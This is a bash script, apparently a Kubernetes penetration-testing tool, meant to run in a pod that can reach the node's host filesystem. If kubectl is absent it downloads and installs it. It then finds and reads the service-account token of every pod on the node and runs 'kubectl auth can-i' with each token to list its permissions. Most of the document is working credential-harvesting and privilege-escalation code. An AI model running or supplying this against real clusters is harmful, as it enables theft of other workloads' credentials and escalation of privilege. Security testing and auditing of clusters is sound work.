#!/bin/bash
# Run this on a pod that has access to the node's filesystem.
# It will find the token/secret for each pod running on the node, and tell you what each token is authorized to do.

if [ $# -gt 0 ]; then
  user_input="$@"
else
  user_input="--list"
fi

if [ ! -f  "/usr/local/bin/kubectl" ]; then
  apt update && apt -y install curl
  #Download and install kubectl into pod
  curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
  chmod +x ./kubectl
  mv ./kubectl /usr/local/bin/kubectl
fi
tokens=`find /host/var/lib/kubelet/pods/ -name token -type l`
#For each token, print the token location and run `kubectl auth can-i list` using each token via the `--token` command line argument.
for filename in $tokens; do
  filename_clean=`echo $filename | tr -dc '[[:print:]]'`
  echo "--------------------------------------------------------"
  echo "Token Location: $filename_clean"
  tokena=`cat $filename_clean`
  echo "Command: kubectl auth can-i $user_input"
  kubectl --token=$tokena auth can-i $user_input
  echo
done
